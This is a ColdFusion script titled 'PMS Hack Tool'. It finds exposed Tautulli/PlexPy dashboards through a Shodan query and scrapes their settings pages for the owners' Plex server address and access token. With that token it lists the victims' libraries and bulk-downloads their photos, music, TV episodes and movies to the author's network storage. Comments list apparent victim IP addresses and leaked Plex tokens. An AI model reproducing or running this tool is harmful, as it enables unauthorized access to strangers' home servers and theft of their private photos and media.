<cfsetting requestTimeOut = "0" />

<cfdirectory name="qMovies" directory="\\ReadyNas2\videos\movies\">
<cfdirectory name="qComedians" directory="\\READYNAS2\Videos\Comedians\">

<cfquery name="qMyMovies" dbtype="query">
	SELECT *
	FROM qMovies
	UNION
	SELECT *
	FROM qComedians
</cfquery>

<cfset movieDropPath = "\\READYNAS2\videos\Drops\movieDrops\">
<cfset tvDropPath = "\\READYNAS2\videos\Drops\tvDrops\">
<cfset musicDropPath = "\\READYNAS2\Videos\Drops\musicDrops\">
<cfset photoDropPath = "\\READYNAS2\Videos\Drops\photoDrops\">

<cfdirectory name="qDropMovies" directory="#movieDropPath#">

<cfdirectory name="qAlbums" recurse="yes" type="dir" directory="\\READYNAS2\Music\">

<cfquery name="qMyAlbums" dbtype="query">
	SELECT *
	FROM qAlbums
</cfquery>

<cfoutput>
<html>
	<head>
		<title>PMS Hack Tool</title>
		
		<script langauge="javascript">
		function copyFileName(fileName) {
			const el = document.createElement('textarea');
			el.value = fileName;
			el.setAttribute('readonly', '');
			el.style.position = 'absolute';
			el.style.left = '-9999px';
			document.body.appendChild(el);
			el.select();
			document.execCommand('copy');
			document.body.removeChild(el);
		}
		</script>
	</head>

	<body></cfoutput>

<cfset oUtility = CreateObject("component", "component.utility")>


<!--- https://www.shodan.io/search?query=CherryPy%2F5.1.0%2Fhome&page=1 --->

<cfif NOT IsDefined('URL.hackIP')>
	<!---
	<cfoutput>No ip</cfoutput><cfabort>
	
	<cfset hackIP = "68.119.35.126">
	<cfset hackIP = "158.69.249.60">

	
	<cfset hackIP = "108.49.235.61">
	<cfset hackIP = "136.24.36.110">
	--->
	<!---
	108.231.225.213
	136.24.36.110 - porn
	--->
	<!--- 96.238.185.114 ---><!--- Homemovies --->
<cfelse>
	<cfset hackIP = URL.hackIP>
</cfif>

	<cfset hackPort = "8181">
	
<cfset strHTTPURL = "http://" & hackIP & ":#hackPort#/settings#chr(35)#tab_tabs-5">
<cfhttp url="#strHTTPURL#" method="GET" resolveurl="Yes" throwOnError="Yes" getasbinary="no"/>

<!---
<cfdump var="#CFHTTP.FileContent#" abort>
--->

<!--- Get PMS Server IP --->
<cfset pmsIP = oUtility.GetHTMLAttributeValue(CFHTTP.FileContent, 'id="pms_ip" name="pms_ip"')>

<!--- Tatulli/PlexPy Setup To Local Address, Assume HackIP Is PMS Server Address --->
<cfif (Left(pmsIP, 3) EQ '192')
	OR (Left(pmsIP, 3) EQ '127')
	OR (Left(pmsIP, 3) EQ '10.')>
	<cfset pmsIP = URL.hackIP>
</cfif>

<!--- Get PMS Server Port --->
<cfset pmsPort = oUtility.GetHTMLAttributeValue(CFHTTP.FileContent, 'id="pms_port" name="pms_port"')>

<!--- Get PMS Token --->
<cfset pmsToken = oUtility.GetHTMLAttributeValue(CFHTTP.FileContent, 'id="pms_token" name="pms_token"')>
<cfset pmsTokenStr = 'X-Plex-Token=' & pmsToken>

<!---
<cfdump var="#pmsIP#">
<cfdump var="#pmsPort#">
<cfdump var="#pmsToken#" abort>

http://158.69.249.60:32400/library/sections?X-Plex-Token=LqdnpZ8aYNJ4qqsbSAsG

http://73.76.159.198:32400/library/sections?X-Plex-Token=NGgwSCu1nkRETpmqEEyf
--->

<cfset pmsURL = 'http://' & pmsIP & ':' & pmsPort>

<cfset urlLibrary = pmsURL & '/library/sections?' & pmsTokenStr>

<!--- Debug: Output Link Listing Libraries --->
<!---
<cfoutput>
<a href="#urlLibrary#" target="_blank">#urlLibrary#</a><br><br></cfoutput><cfabort>
--->

<cfhttp url="#urlLibrary#" method="GET" resolveurl="Yes" throwOnError="Yes" getasbinary="no"/>

<cfset xmlResponse = XmlParse(Trim(CFHTTP.FileContent))>

<cfif StructKeyExists(xmlResponse, 'MediaContainer')>
	<cfif StructKeyExists(xmlResponse.MediaContainer, 'XMLChildren')>

		<cfset aLibraries = xmlResponse.MediaContainer.XMLChildren>


		<cfif IsArray(aLibraries)>
			<cfloop array="#aLibraries#" index="library">
				<cfif StructKeyExists(library, 'XmlAttributes')>
					<cfif StructKeyExists(library.XmlAttributes, 'key')>
						<cfif (library.XmlAttributes.type EQ 'photo') AND ((NOT IsDefined('URL.type')) OR (URL.type EQ 'photo'))>
							<cfoutput>
							<br><br><a href="#pmsURL#/library/sections/#library.XmlAttributes.key#/all?#pmsTokenStr#" target="_blank">"#library.XmlAttributes.title#" (#library.XmlAttributes.type#)</a><br><br></cfoutput>

							<cfset qTheirPhotos = oUtility.GetPhotos(
								libraryTitle = library.XmlAttributes.title,
								url = pmsURL & '/library/sections/' & library.XmlAttributes.key & '/all?' & pmsTokenStr
							)>
							
							<cfif IsDefined('URL.download') AND (URL.download)>
								
								<cfset oUtility.DownloadPhotos(
									pmsURL = pmsURL,
									pmsTokenStr = pmsTokenStr,
									qTheirPhotos = qTheirPhotos,
									photoDropPath = photoDropPath
								)>
							<cfelse>
								<cfdump var="#qTheirPhotos#" label="#library.XmlAttributes.title#" expand="no">
							</cfif>
							
						<cfelseif (library.XmlAttributes.type EQ 'artist') AND ((NOT IsDefined('URL.type')) OR (URL.type EQ 'artist'))>
							<cfoutput>
							<br><br><a href="#pmsURL#/library/sections/#library.XmlAttributes.key#/all?#pmsTokenStr#" target="_blank">"#library.XmlAttributes.title#" (#library.XmlAttributes.type#)</a><br><br></cfoutput>

							<cfset qTheirArtists = oUtility.GetArtists(
								libraryTitle = library.XmlAttributes.title,
								url = pmsURL & '/library/sections/' & library.XmlAttributes.key & '/all?' & pmsTokenStr
							)>
							
							<cfif IsDefined('URL.artistTitle')>
								<cfquery name="qTheirArtists" dbtype="query">
									SELECT *
									FROM qTheirArtists
									WHERE UPPER(artistTitle) = '#UCase(Trim(URL.artistTitle))#'
								</cfquery>
							</cfif>
							
							<cfquery name="qTheirArtists" dbtype="query">
								SELECT *
								FROM qTheirArtists
							</cfquery>
									
							<cfif (qTheirArtists.recordcount GT 0)>								
								<cfset qTheirAlbums = oUtility.GetAlbums(
									libraryTitle = library.XmlAttributes.title,
									qTheirArtists = qTheirArtists,
									pmsURL = pmsURL,
									pmsTokenStr = pmsTokenStr
								)>
								
								<cfif IsDefined('URL.albumTitle')>
									<cfquery name="qTheirAlbums" dbtype="query">
										SELECT *
										FROM qTheirAlbums
										WHERE UPPER(albumTitle) = '#UCase(Trim(URL.albumTitle))#'
									</cfquery>
								</cfif>
								
								<cfset qTheirAlbums = oUtility.FlagDuplicateAlbums(
									qMyAlbums = qMyAlbums,
									qTheirAlbums = qTheirAlbums
								)>
								
								<cfquery name="qTheirAlbumsNonDuplicates" dbtype="query">
									SELECT *
									FROM qTheirAlbums
									WHERE duplicate = <cfqueryparam value="0" cfsqltype="CF_SQL_BIT">
									ORDER BY artistTitle, albumTitle
								</cfquery>
								
								
								<cfif (qTheirAlbumsNonDuplicates.recordcount GT 0)>
									<cfset qTheirTracks = oUtility.GetTracks(
										libraryTitle = library.XmlAttributes.title,
										qTheirAlbums = qTheirAlbumsNonDuplicates,
										pmsURL = pmsURL,
										pmsTokenStr = pmsTokenStr
									)>
									
									<!--- Debug --->
									<!------>
									<cfdump var="#qTheirTracks#" format="html" output="#musicDropPath#Full_Listing.html">
									
									<cfif IsDefined('URL.download') AND (URL.download)>
										<cfset oUtility.DownloadTracks(
											pmsURL = pmsURL,
											pmsTokenStr = pmsTokenStr,
											qTheirTracks = qTheirTracks,
											musicDropPath = musicDropPath
										)>
									<cfelse>
										<cfdump var="#qTheirTracks#" label="Tracks" expand="no">
									</cfif>
								</cfif>
							</cfif>
						<cfelseif (library.XmlAttributes.type EQ 'show') AND ((NOT IsDefined('URL.type')) OR (URL.type EQ 'show'))>
							<cfoutput>
							<br><br><a href="#pmsURL#/library/sections/#library.XmlAttributes.key#/all?#pmsTokenStr#" target="_blank">"#library.XmlAttributes.title#" (#library.XmlAttributes.type#)</a><br><br></cfoutput>

							<cfset qTheirShows = oUtility.GetShows(
								libraryTitle = library.XmlAttributes.title,
								url = pmsURL & '/library/sections/' & library.XmlAttributes.key & '/all?' & pmsTokenStr
							)>
							
							<cfif IsDefined('URL.showShows') AND (URL.showShows) AND (NOT IsDefined('URL.showTitle'))>
								<!---
								<cfdump var="#qTheirShows#">
								--->
							<cfelse>
								<!---
								<cfset URL.showTitle = 'Bobcat Goldthwait''s Misfits & Monsters'>
								--->
								
								<cfif IsDefined('URL.showTitle')>
									<cfquery name="qTheirShows" dbtype="query">
										SELECT *
										FROM qTheirShows
										WHERE UPPER(showTitle) = <cfqueryparam value="#UCase(Trim(URL.showTitle))#" CFSQLType="CF_SQL_VARCHAR">
									</cfquery>
								</cfif>
								
								<!------>
								
								
								
								<cfif (qTheirShows.recordcount GT 0)>								
									<cfset qTheirSeasons = oUtility.GetSeasons(
										libraryTitle = library.XmlAttributes.title,
										qTheirShows = qTheirShows,
										pmsURL = pmsURL,
										pmsTokenStr = pmsTokenStr
									)>
									
									<!---
									<cfset URL.seasonTitle = 'Season 1'>
									--->
								
									<cfif IsDefined('URL.seasonTitle')>
										<cfquery name="qTheirSeasons" dbtype="query">
											SELECT *
											FROM qTheirSeasons
											WHERE UPPER(seasonTitle) = '#UCase(Trim(URL.seasonTitle))#'
										</cfquery>
									</cfif>
									
									<cfif (qTheirSeasons.recordcount GT 0)>
										<cfif IsDefined('URL.listSeasons') AND (URL.listSeasons)>
											<cfloop query="#qTheirSeasons#">
												<cfoutput><a href="#pmsURL##qTheirSeasons.seasonKey#?#pmsTokenStr#" target="_blank">#qTheirSeasons.showTitle# - #qTheirSeasons.seasonTitle# </a><br></cfoutput>
											</cfloop>					
										<cfelse>
											<cfset qTheirEpisodes = oUtility.GetEpisodes(
												libraryTitle = library.XmlAttributes.title,
												qTheirSeasons = qTheirSeasons,
												pmsURL = pmsURL,
												pmsTokenStr = pmsTokenStr
											)>
											
											<cfquery name="qTheirEpisodes" dbtype="query">
												SELECT *
												FROM qTheirEpisodes
											</cfquery>
											
											<!---
											<cfdump var="#qTheirEpisodes#">
											--->
											
											<cfif IsDefined('URL.download') AND (URL.download)>
												<cfset  oUtility.DownloadEpisodes(
													pmsURL = pmsURL,
													pmsTokenStr = pmsTokenStr,
													qTheirEpisodes = qTheirEpisodes,
													tvDropPath = tvDropPath
												)>
											<cfelse>
												<cfdump var="#qTheirEpisodes#" label="#qTheirSeasons.showTitle# - #qTheirSeasons.seasonTitle#" expand="no">
											</cfif>
										</cfif>
									</cfif>
								</cfif>
							</cfif>
						<cfelseif (library.XmlAttributes.type EQ 'movie') AND ((NOT IsDefined('URL.type')) OR (URL.type EQ 'movie'))>
							<cfoutput>
							<br><br><a href="#pmsURL#/library/sections/#library.XmlAttributes.key#/all?#pmsTokenStr#" target="_blank">"#library.XmlAttributes.title#" (#library.XmlAttributes.type#)</a><br><br></cfoutput>

							<cfif ((NOT IsDefined('URL.library')) OR (URL.library EQ library.XmlAttributes.title))>
								<cfset qTheirMovies = oUtility.GetMovieLibrary(
									pmsURL = pmsURL,
									pmsTokenStr = pmsTokenStr,
									libraryTitle = library.XmlAttributes.title,
									url = pmsURL & '/library/sections/' & library.XmlAttributes.key & '/all?' & pmsTokenStr
								)>								
								
								<cfset qTheirMovies = oUtility.FlagDuplicateMovies(
									qMyMovies = qMyMovies,
									qDropMovies = qDropMovies,
									qTheirMovies = qTheirMovies
								)>
								
								<cfquery name="qTheirMoviesNonDuplicates" dbtype="query" maxrows="1">
									SELECT *
									FROM qTheirMovies
									WHERE duplicate = <cfqueryparam value="0" cfsqltype="CF_SQL_BIT">
										<!--- AND [year] = <cfqueryparam value="2018" cfsqltype="CF_SQL_INTEGER"> --->
										AND [size] < <cfqueryparam value="4000000000" cfsqltype="CF_SQL_BIGINT">
								</cfquery>
	
								<cfif (qTheirMoviesNonDuplicates.recordcount GT 0)
									AND IsDefined('URL.download') AND (URL.download)>
									
									<cfset oUtility.DownloadMovies(
										pmsURL = pmsURL,
										pmsTokenStr = pmsTokenStr,
										qTheirMovies = qTheirMoviesNonDuplicates,
										movieDropPath = movieDropPath
									)>
								<cfelse>
									<cfdump var="#qTheirMoviesNonDuplicates#" label="#library.XmlAttributes.title#" expand="no">
								</cfif>
							</cfif>	
						</cfif>
						
						
						
						<!--- // Load Library --->
					</cfif>
				</cfif>
				
				<!---
				<cfif IsDefined('qTheirMoviesNonDuplicates') AND (qTheirMoviesNonDuplicates.recordcount GT 0)>
					<cfdump var="#qTheirMoviesNonDuplicates#">
				<cfelse>
					<cfoutput>There were no qualifying items to download for the "#library.XmlAttributes.title#" library.</cfoutput>
				</cfif>
				--->
				
			</cfloop>
		</cfif>
	</cfif>
</cfif>

<cfoutput>
</body>

</html></cfoutput>
